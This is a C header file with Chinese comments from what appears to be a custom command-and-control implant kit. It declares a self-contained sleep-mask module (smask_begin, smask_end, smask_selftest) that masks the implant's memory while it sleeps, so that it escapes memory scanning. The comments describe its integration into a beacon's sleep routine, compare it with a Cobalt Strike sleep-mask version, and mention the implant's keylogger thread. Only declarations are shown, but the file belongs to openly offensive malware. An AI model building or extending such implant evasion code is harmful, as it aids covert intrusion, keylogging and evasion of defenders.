/*
 * csdev :: sleepmask2.h  --  自包含 Sleep Mask (v2)
 * ==========================================================================
 * 与 kits/sleepmask/sleepmask.c 的区别:
 *   旧版实现的是 **Cobalt Strike 的 sleep mask ABI**(sleep_mask(info,heap,size)),
 *   由 CS 的 Beacon 在休眠前后调用, 只在 cs_dev.cna 那条路径上可用。
 *   本文件是**自包含**版本: 植入体自己调用, 不需要外部宿主, 因此协议 v2 的
 *   载荷也能获得休眠期内存掩码。
 *
 * 用法 (beacon2.c 的 beacon_sleep 内):
 *     int masked = smask_begin();     // 休眠前: 掩码非执行节
 *     ... Sleep(...) ...
 *     if (masked) smask_end();        // 唤醒后: 还原
 * ==========================================================================
 */
#ifndef CSDEV_SLEEPMASK2_H
#define CSDEV_SLEEPMASK2_H

/* 休眠前调用。成功返回 1 (后续必须调 smask_end), 跳过返回 0。
 * 跳过的情况: 键盘记录线程正在运行 (它会访问全局数据, 掩码会使其崩溃)。 */
int smask_begin(void);

/* 唤醒后调用, 还原被掩码的节 */
void smask_end(void);

/* 自测用: 对一段缓冲做一次掩码往返, 返回 1 表示还原后逐字节一致 */
int smask_selftest(void);

#endif /* CSDEV_SLEEPMASK2_H */
